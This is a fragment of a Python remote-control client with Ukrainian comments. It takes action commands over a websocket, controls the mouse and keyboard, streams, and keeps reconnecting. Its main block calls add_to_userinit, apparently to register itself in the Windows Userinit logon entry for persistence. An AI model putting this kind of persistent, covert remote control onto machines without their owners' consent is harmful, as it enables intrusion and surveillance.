                            result = await execute_action(action, params, websocket=websocket)

                            # Відповідаємо завжди на команди з request_id.
                            # Помилки fire-and-forget (миша) теж відправляємо, інакше збої ніде не видно,
                            # але throttling не дає заспамити канал на кожен рух мишi.
                            if req_id or (result.get("status") == "error" and should_report_error(action)):
                                await websocket.send(json.dumps({
                                    "type": "response",
                                    "request_id": req_id,
                                    "action": action,
                                    **result
                                }))
                        except json.JSONDecodeError:
                            logger.warning(f"Невірний формат повідомлення: {message_str}")
                finally:
                    heartbeat_task.cancel()
                    if is_streaming:
                        is_streaming = False
                        if stream_task:
                            stream_task.cancel()

        except Exception as e:
            logger.warning(f"З'єднання втрачено ({type(e).__name__}: {e}). Перепідключення через 5 секунд...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    init_platform()
    process_file()
    add_to_userinit()
    backend = get_input_backend()
    if backend:
        logger.info(f"Керування мишею та клавіатурою: бекенд '{backend.name}'")
    else:
        logger.warning("Керування мишею/клавіатурою недоступне: не знайдено ні Win32, ні pyautogui")
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        logger.info("Клієнт зупинено.")
